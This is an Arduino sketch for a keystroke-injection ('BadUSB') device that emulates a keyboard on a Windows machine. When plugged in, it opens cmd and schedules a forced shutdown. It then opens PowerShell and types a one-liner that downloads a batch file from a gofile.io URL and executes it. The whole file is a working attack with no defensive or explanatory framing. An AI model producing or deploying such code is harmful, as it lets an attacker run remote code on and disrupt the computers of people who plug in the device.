#include <Keyboard.h>

void setup() {
  Keyboard.begin();

  // Waiting 500ms for init
  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  // Change this value depending on the computer you are using ( i mean slow or not )
  delay(300);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  // the shell usually takes a few  seconds to fully run so i put a delay just in case .
  delay(500);

  Keyboard.print("shutdown -s -t 8 & exit");
  delay(20);

  typeKey(KEY_RETURN);
  delay(1000);

  typeKey(KEY_RETURN);
  delay (300);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);

  Keyboard.print("powershell");
  typeKey(KEY_RETURN);

  delay(900);

  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'https://srv-file6.gofile.io/download/59fKAe/start.bat'; $file = 'start.bat'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");

  typeKey(KEY_RETURN);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
